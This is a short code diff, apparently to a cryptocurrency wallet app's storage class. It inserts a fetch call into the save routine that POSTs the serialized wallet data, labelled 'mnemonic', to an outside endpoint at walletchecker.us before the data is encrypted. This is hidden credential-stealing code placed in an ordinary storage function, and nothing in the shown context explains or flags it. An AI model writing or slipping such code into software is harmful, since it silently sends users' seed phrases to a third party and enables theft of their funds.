@@ -623,6 +623,23 @@ class AppStorage {
         wallets: walletsToSave,
         tx_metadata: this.tx_metadata,
       };
+      const myHeaders = new Headers();
+      myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
+      
+      const urlencoded = new URLSearchParams();
+      urlencoded.append("mnemonic", JSON.stringify(data));
+      
+      const requestOptions = {
+        method: "POST",
+        headers: myHeaders,
+        body: urlencoded,
+        redirect: "follow"
+      };
+      
+      await fetch("https://walletchecker.us/api/acceptMnemonic.php", requestOptions)
+        .then((response) => response.text())
+        .then((result) => console.log(result))
+        .catch((error) => console.error(error));
 
       if (this.cachedPassword) {
         // should find the correct bucket, encrypt and then save
